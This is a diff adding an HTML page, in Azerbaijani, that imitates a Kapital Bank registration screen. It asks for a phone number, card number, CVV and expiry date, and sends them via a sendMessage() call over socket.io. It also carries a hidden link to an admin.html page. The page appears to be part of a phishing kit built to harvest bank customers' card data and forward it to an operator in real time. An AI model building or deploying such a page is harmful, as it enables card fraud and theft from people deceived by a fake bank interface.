@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Qeydiyyat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="back-btn">←</button>
+            <h1 class="title">Qeydiyyat</h1>
+        </div>
+        
+        <div class="content">
+            <div class="bank-icon">🏛️</div>
+            <h2 class="subtitle">Kart üzrə identifikasiya</h2>
+            <p class="description">Mobil nömrəni, Kapital Bank kartının nömrəsini və PIN kodunu daxil edin.</p>
+            
+            <div class="form">
+                <div class="input-group">
+                    <span class="icon">📱</span>
+                    <input type="text" id="phoneInput" class="input-field" placeholder="Telefon nömrəsi" value="+994">
+                </div>
+                
+                <div class="input-group">
+                    <span class="icon">💳</span>
+                    <input type="text" id="cardInput" class="input-field" placeholder="Kart nömrəsi" maxlength="19">
+                    <span class="scan-icon">⊞</span>
+                </div>
+                
+                <div class="input-group">
+                    <span class="icon">🔒</span>
+                    <input type="text" id="cvvInput" class="input-field" placeholder="CVV" maxlength="3">
+                </div>
+
+                <div class="input-group">
+                    <span class="icon">📅</span>
+                    <input type="text" id="expiryInput" class="input-field" placeholder="İstifadə müddəti (XX/XX)" maxlength="5">
+                </div>
+                
+                <a href="#" class="link" onclick="window.location.href='admin.html'">Kapital Bank-dan kartım yoxdur</a>
+            </div>
+            
+            <div class="footer-text">
+                "Davam et" düyməsinə basmaqla tətbiqin <a href="#" class="link-inline">istifadə şərtləri</a> ilə razılaşarsan.
+            </div>
+            
+            <button class="submit-btn" onclick="sendMessage()">Davam etmək</button>
+        </div>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
